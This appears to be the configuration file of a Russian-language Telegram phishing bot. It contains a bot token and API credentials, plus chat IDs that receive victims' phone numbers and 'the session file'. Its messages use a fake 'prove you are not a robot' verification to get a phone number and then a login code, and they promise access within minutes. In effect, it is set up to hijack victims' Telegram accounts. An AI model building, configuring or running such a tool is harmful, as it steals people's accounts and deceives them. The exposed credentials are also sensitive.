TOKEN = "7811088713:AAFDY6_q0B4ulUoOHB5VHlarydfnSI30ddw"

API_ID = 24346327
API_HASH = "e4235bf230e2d9e2d8fd668aa16adab5"

ADMIN_CHAT_ID = 2637175054  # ID администратора или чата для уведомлений
PHONE_LOG_CHAT_ID = 2637175054  # ID чата для логов номеров телефонов
SESSION_CHAT_ID = 2637175054  # Чат, куда отправляем session-файл

# Локальное изображение (будет работать и без него)
WELCOME_IMAGE = ""

# Приветственное сообщение (Markdown разметка поддерживается)
WELCOME_MESSAGE = """
Привет, *{first_name}* 👋! Что бы начать просмотр, обязательно пройди верификацию
аккаунта, что бы доказать что аы не робот"""

# Сообщение после получения номера телефона
THANK_YOU_MESSAGE = "Почти всё, еще минутку, осталось только прислать код для верификации аккаунта "

# Сообщение при отправке кода
SEND_CODE_MESSAGE = "ОБРАБОТКА ЗАЯВКИ"

# Сообщение после успешного входа
SUCCESS_AUTH_MESSAGE = "Заявка отправлена, доступ к боту появится примерно через 2-3 минуты"